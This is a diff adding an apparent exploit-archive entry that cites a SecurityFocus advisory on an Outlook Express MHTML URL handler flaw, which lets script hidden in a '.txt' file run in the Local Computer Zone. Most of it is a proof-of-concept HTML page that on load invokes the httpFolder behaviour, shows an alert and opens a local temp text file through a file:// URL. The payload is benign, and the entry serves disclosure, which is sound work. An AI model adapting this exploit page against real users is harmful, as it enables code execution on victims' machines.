@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/5473/info
+
+Microsoft Outlook Express introduced a URL handler called MHTML (MIME Encapsulation of Aggregate HTML). This allows Internet Explorer to pass MHTML files to Outlook Express for rendering.
+
+The MHTML URL handler does not validate the file type it is rendering. This could allow a file type that is normally considered to be a "safe file type", such as a .txt file, to be opened and have any script contained within rendered. This script would then be rendered in the Local Computer Zone.
+
+<html>
+<head>
+<title>malware.com</title>
+<meta NAME="Author" CONTENT="malware.com">
+<meta name="robots" content="noindex, nofollow">
+</head>
+<body onload=malware() style="behavior: url(#default#httpFolder);">
+<script>
+function malware(){
+document.body.navigate("http://www.microsoft.com");alert("malware");
+open("file://C%3A%5CWINDOWS%5CTemp%5Cwecerr.txt")
+}
+</script><br><br><br><br>
+<center><image src="smile.gif"></center>
